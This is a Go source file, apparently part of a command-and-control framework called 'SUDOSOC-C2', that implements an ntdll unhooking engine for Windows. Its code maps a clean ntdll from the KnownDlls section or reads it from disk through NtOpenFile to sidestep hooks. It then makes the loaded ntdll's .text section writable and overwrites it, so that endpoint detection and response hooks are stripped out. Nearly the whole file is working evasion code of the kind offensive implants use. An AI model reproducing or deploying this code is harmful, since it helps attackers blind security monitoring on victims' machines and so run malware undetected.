//go:build windows

package ntdllunhook

/*
	SUDOSOC-C2 — NTDLL Unhooking Engine
	Copyright (C) 2026  sudosoc — Seif

	Strategy: Load a fresh, unhooked copy of ntdll.dll directly from
	disk (or KnownDlls section) and overwrite the hooked .text section
	in the current process's ntdll with the clean copy.

	Why it works:
	  EDRs hook ntdll by patching the first few bytes of each stub with
	  a JMP to their monitoring code. By loading ntdll from disk before
	  the EDR can hook it (or loading a second copy), we restore the
	  original bytes — all EDR hooks are eliminated in one shot.

	Three unhooking methods (in order of stealth):
	  1. KnownDlls section  — no disk I/O, cleanest
	  2. SysWOW64/ntdll.dll — read from disk via NtOpenFile (no CreateFile hook)
	  3. Suspend + overwrite — brute force but always works
*/

import (
	"fmt"
	"os"
	"path/filepath"
	"unsafe"

	"golang.org/x/sys/windows"
)

const (
	// Hooked bytes pattern — EDRs typically replace with E9 (JMP rel32)
	jmpByte = 0xE9

	// ntdll.dll standard path
	ntdllPath32 = `C:\Windows\SysWOW64\ntdll.dll`
	ntdllPath64 = `C:\Windows\System32\ntdll.dll`
)

// UnhookAll restores all hooked stubs in the current process's ntdll.
// Returns the number of stubs restored and any error.
func UnhookAll() (int, error) {
	// Method 1: Try via KnownDlls (most stealthy — no disk I/O)
	n, err := unhookViaKnownDlls()
	if err == nil {
		return n, nil
	}

	// Method 2: Load from disk via NtOpenFile (bypasses CreateFile hooks)
	n, err = unhookViaDiskLoad()
	if err == nil {
		return n, nil
	}

	return 0, fmt.Errorf("all unhooking methods failed: %v", err)
}

// unhookViaKnownDlls maps ntdll from the KnownDlls section.
// KnownDlls is a kernel-maintained cache of important DLLs —
// the kernel loads them before user-mode hooks are installed.
func unhookViaKnownDlls() (int, error) {
	// Open \KnownDlls\ntdll.dll section object
	sectionName, err := windows.UTF16PtrFromString(`\KnownDlls\ntdll.dll`)
	if err != nil {
		return 0, err
	}

	oa := windows.OBJECT_ATTRIBUTES{}
	name := windows.NTUnicodeString{}
	name.Length = uint16(len(`\KnownDlls\ntdll.dll`) * 2)
	name.MaximumLength = name.Length + 2
	name.Buffer = sectionName
	oa.Length = uint32(unsafe.Sizeof(oa))
	oa.ObjectName = &name
	oa.Attributes = windows.OBJ_CASE_INSENSITIVE

	var hSection windows.Handle
	status := ntOpenSection(&hSection,
		windows.SECTION_MAP_READ|windows.SECTION_QUERY,
		&oa)
	if !ntSuccess(status) {
		return 0, fmt.Errorf("NtOpenSection failed: 0x%x", status)
	}
	defer windows.CloseHandle(hSection)

	// Map the clean section into our address space
	var cleanBase uintptr
	var viewSize uintptr
	status = ntMapViewOfSection(hSection,
		windows.CurrentProcess(),
		&cleanBase, 0, 0, nil, &viewSize,
		viewShareAlways, 0,
		windows.PAGE_READONLY)
	if !ntSuccess(status) {
		return 0, fmt.Errorf("NtMapViewOfSection failed: 0x%x", status)
	}
	defer ntUnmapViewOfSection(windows.CurrentProcess(), cleanBase)

	return overwriteHookedText(cleanBase)
}

// unhookViaDiskLoad reads ntdll from disk using low-level NtOpenFile
// (bypasses any CreateFile/ReadFile hooks the EDR may have installed)
func unhookViaDiskLoad() (int, error) {
	ntdll := ntdllPath64
	if !is64bit() {
		ntdll = ntdllPath32
	}

	// Use NtOpenFile to avoid CreateFile hooks
	data, err := readFileViaNtOpenFile(ntdll)
	if err != nil {
		// Fallback to regular read (less stealthy but works)
		data, err = os.ReadFile(ntdll)
		if err != nil {
			return 0, fmt.Errorf("cannot read ntdll: %v", err)
		}
	}

	// Map the PE file and find its .text section
	cleanTextOffset, cleanTextData, err := extractTextSection(data)
	if err != nil {
		return 0, err
	}
	_ = cleanTextOffset

	// Get the loaded ntdll base in current process
	hookedBase, err := getLoadedNtdllBase()
	if err != nil {
		return 0, err
	}

	// Find .text section in the loaded (hooked) ntdll
	hookedTextVA, hookedTextSize, err := getLoadedTextSection(hookedBase)
	if err != nil {
		return 0, err
	}

	if uint32(len(cleanTextData)) < hookedTextSize {
		return 0, fmt.Errorf("clean ntdll .text smaller than hooked")
	}

	// Make the hooked region writable
	var oldProtect uint32
	err = windows.VirtualProtect(
		hookedTextVA,
		uintptr(hookedTextSize),
		windows.PAGE_EXECUTE_READWRITE,
		&oldProtect)
	if err != nil {
		return 0, fmt.Errorf("VirtualProtect failed: %v", err)
	}

	// Overwrite byte-by-byte, counting restored hooks
	hookedSlice := unsafe.Slice((*byte)(unsafe.Pointer(hookedTextVA)), hookedTextSize)
	restored := 0
	for i := uint32(0); i < hookedTextSize; i++ {
		if hookedSlice[i] == jmpByte && cleanTextData[i] != jmpByte {
			restored++
		}
		hookedSlice[i] = cleanTextData[i]
	}

	// Restore original protection
	windows.VirtualProtect(hookedTextVA, uintptr(hookedTextSize), oldProtect, &oldProtect)

	return restored, nil
}

// overwriteHookedText compares the clean ntdll mapping with the loaded
// (hooked) ntdll and patches back any modified stubs.
func overwriteHookedText(cleanBase uintptr) (int, error) {
	hookedBase, err := getLoadedNtdllBase()
	if err != nil {
		return 0, err
	}

	hookedTextVA, hookedTextSize, err := getLoadedTextSection(hookedBase)
	if err != nil {
		return 0, err
	}
	cleanTextVA, _, err := getLoadedTextSection(cleanBase)
	if err != nil {
		return 0, err
	}

	var oldProtect uint32
	_ = windows.VirtualProtect(hookedTextVA, uintptr(hookedTextSize),
		windows.PAGE_EXECUTE_READWRITE, &oldProtect)

	hooked := unsafe.Slice((*byte)(unsafe.Pointer(hookedTextVA)), hookedTextSize)
	clean  := unsafe.Slice((*byte)(unsafe.Pointer(cleanTextVA)), hookedTextSize)

	restored := 0
	for i := range hooked {
		if hooked[i] != clean[i] {
			if hooked[i] == jmpByte {
				restored++
			}
			hooked[i] = clean[i]
		}
	}

	windows.VirtualProtect(hookedTextVA, uintptr(hookedTextSize), oldProtect, &oldProtect)
	return restored, nil
}

// ── Helpers ──────────────────────────────────────────────────────────

func is64bit() bool {
	return unsafe.Sizeof(uintptr(0)) == 8
}

func getLoadedNtdllBase() (uintptr, error) {
	snap, err := windows.CreateToolhelp32Snapshot(windows.TH32CS_SNAPMODULE, 0)
	if err != nil {
		return 0, err
	}
	defer windows.CloseHandle(snap)

	var me windows.ModuleEntry32
	me.Size = uint32(unsafe.Sizeof(me))
	for err = windows.Module32First(snap, &me); err == nil; err = windows.Module32Next(snap, &me) {
		name := windows.UTF16ToString(me.Module[:])
		if name == "ntdll.dll" {
			return uintptr(unsafe.Pointer(me.ModBaseAddr)), nil
		}
	}
	return 0, fmt.Errorf("ntdll.dll not found in module list")
}

func getLoadedTextSection(base uintptr) (va uintptr, size uint32, err error) {
	dosHdr := (*IMAGE_DOS_HEADER)(unsafe.Pointer(base))
	if dosHdr.E_magic != 0x5A4D { // MZ
		return 0, 0, fmt.Errorf("not a PE file at 0x%x", base)
	}
	ntHdr := (*IMAGE_NT_HEADERS64)(unsafe.Pointer(base + uintptr(dosHdr.E_lfanew)))
	numSections := ntHdr.FileHeader.NumberOfSections
	secHdrBase := base + uintptr(dosHdr.E_lfanew) +
		4 + unsafe.Sizeof(ntHdr.FileHeader) +
		uintptr(ntHdr.FileHeader.SizeOfOptionalHeader)

	for i := uint16(0); i < numSections; i++ {
		sec := (*IMAGE_SECTION_HEADER)(unsafe.Pointer(secHdrBase + uintptr(i)*unsafe.Sizeof(IMAGE_SECTION_HEADER{})))
		name := string(bytes_trimNull(sec.Name[:]))
		if name == ".text" {
			return base + uintptr(sec.VirtualAddress), sec.SizeOfRawData, nil
		}
	}
	return 0, 0, fmt.Errorf(".text section not found")
}

func extractTextSection(data []byte) (offset uint32, text []byte, err error) {
	if len(data) < 64 {
		return 0, nil, fmt.Errorf("file too small")
	}
	dosHdr := (*IMAGE_DOS_HEADER)(unsafe.Pointer(&data[0]))
	if dosHdr.E_magic != 0x5A4D {
		return 0, nil, fmt.Errorf("not a PE")
	}
	ntHdrOff := dosHdr.E_lfanew
	ntHdr := (*IMAGE_NT_HEADERS64)(unsafe.Pointer(&data[ntHdrOff]))
	numSec := ntHdr.FileHeader.NumberOfSections
	secOff := ntHdrOff + 4 + 20 + uint32(ntHdr.FileHeader.SizeOfOptionalHeader)

	for i := uint16(0); i < numSec; i++ {
		sec := (*IMAGE_SECTION_HEADER)(unsafe.Pointer(&data[secOff+uint32(i)*40]))
		name := string(bytes_trimNull(sec.Name[:]))
		if name == ".text" {
			start := sec.PointerToRawData
			end := start + sec.SizeOfRawData
			if int(end) > len(data) {
				end = uint32(len(data))
			}
			return sec.PointerToRawData, data[start:end], nil
		}
	}
	return 0, nil, fmt.Errorf(".text not found")
}

func readFileViaNtOpenFile(path string) ([]byte, error) {
	// Convert to NT path format: C:\... → \??\C:\...
	ntPath := `\??\` + filepath.ToSlash(path)
	ntPath = `\??\` + path

	wPath, err := windows.UTF16PtrFromString(ntPath)
	if err != nil {
		return nil, err
	}

	var ioStatus windows.IO_STATUS_BLOCK
	name := windows.NTUnicodeString{}
	name.Length = uint16(len(ntPath) * 2)
	name.MaximumLength = name.Length + 2
	name.Buffer = wPath

	oa := windows.OBJECT_ATTRIBUTES{}
	oa.Length = uint32(unsafe.Sizeof(oa))
	oa.ObjectName = &name
	oa.Attributes = windows.OBJ_CASE_INSENSITIVE

	var hFile windows.Handle
	status := ntOpenFile(&hFile,
		windows.SYNCHRONIZE|windows.FILE_READ_DATA,
		&oa, &ioStatus,
		windows.FILE_SHARE_READ,
		0x20) // FILE_SYNCHRONOUS_IO_NONALERT
	if !ntSuccess(status) {
		return nil, fmt.Errorf("NtOpenFile 0x%x", status)
	}
	defer windows.CloseHandle(hFile)

	// Read file content
	fi, err := windows.GetFileInformationByHandle(hFile, &windows.ByHandleFileInformation{})
	_ = fi
	if err != nil {
		return nil, err
	}

	var buf [1 << 22]byte // 4MB max
	var read uint32
	err = windows.ReadFile(hFile, buf[:], &read, nil)
	if err != nil {
		return nil, err
	}
	return buf[:read], nil
}

func bytes_trimNull(b []byte) []byte {
	for i, v := range b {
		if v == 0 {
			return b[:i]
		}
	}
	return b
}

func ntSuccess(status uintptr) bool {
	return int32(status) >= 0
}

// ── PE structures ─────────────────────────────────────────────────

type IMAGE_DOS_HEADER struct {
	E_magic    uint16
	_          [29]uint16
	E_lfanew   uint32
}

type IMAGE_FILE_HEADER struct {
	Machine              uint16
	NumberOfSections     uint16
	TimeDateStamp        uint32
	PointerToSymbolTable uint32
	NumberOfSymbols      uint32
	SizeOfOptionalHeader uint16
	Characteristics      uint16
}

type IMAGE_NT_HEADERS64 struct {
	Signature  uint32
	FileHeader IMAGE_FILE_HEADER
	// Optional header follows
}

type IMAGE_SECTION_HEADER struct {
	Name                 [8]byte
	VirtualSize          uint32
	VirtualAddress       uint32
	SizeOfRawData        uint32
	PointerToRawData     uint32
	PointerToRelocations uint32
	PointerToLinenumbers uint32
	NumberOfRelocations  uint16
	NumberOfLinenumbers  uint16
	Characteristics      uint32
}

// ── Syscall wrappers (direct to avoid hook on NtOpenSection etc.) ──

var (
	ntdll             = windows.MustLoadDLL("ntdll.dll")
	procNtOpenSection = ntdll.MustFindProc("NtOpenSection")
	procNtMapView     = ntdll.MustFindProc("NtMapViewOfSection")
	procNtUnmapView   = ntdll.MustFindProc("NtUnmapViewOfSection")
	procNtOpenFile    = ntdll.MustFindProc("NtOpenFile")
)

const viewShareAlways = 1

func ntOpenSection(handle *windows.Handle, access uint32, oa *windows.OBJECT_ATTRIBUTES) uintptr {
	r, _, _ := procNtOpenSection.Call(
		uintptr(unsafe.Pointer(handle)),
		uintptr(access),
		uintptr(unsafe.Pointer(oa)))
	return r
}

func ntMapViewOfSection(section, process windows.Handle, base *uintptr, zeroBits, commitSize uintptr,
	offset *int64, viewSize *uintptr, inheritDisp, allocType, protect uint32) uintptr {
	r, _, _ := procNtMapView.Call(
		uintptr(section), uintptr(process),
		uintptr(unsafe.Pointer(base)), zeroBits, commitSize,
		uintptr(unsafe.Pointer(offset)),
		uintptr(unsafe.Pointer(viewSize)),
		uintptr(inheritDisp), uintptr(allocType), uintptr(protect))
	return r
}

func ntUnmapViewOfSection(process windows.Handle, base uintptr) uintptr {
	r, _, _ := procNtUnmapView.Call(uintptr(process), base)
	return r
}

func ntOpenFile(handle *windows.Handle, access uint32, oa *windows.OBJECT_ATTRIBUTES,
	ioStatus *windows.IO_STATUS_BLOCK, share, openOptions uint32) uintptr {
	r, _, _ := procNtOpenFile.Call(
		uintptr(unsafe.Pointer(handle)), uintptr(access),
		uintptr(unsafe.Pointer(oa)),
		uintptr(unsafe.Pointer(ioStatus)),
		uintptr(share), uintptr(openOptions))
	return r
}
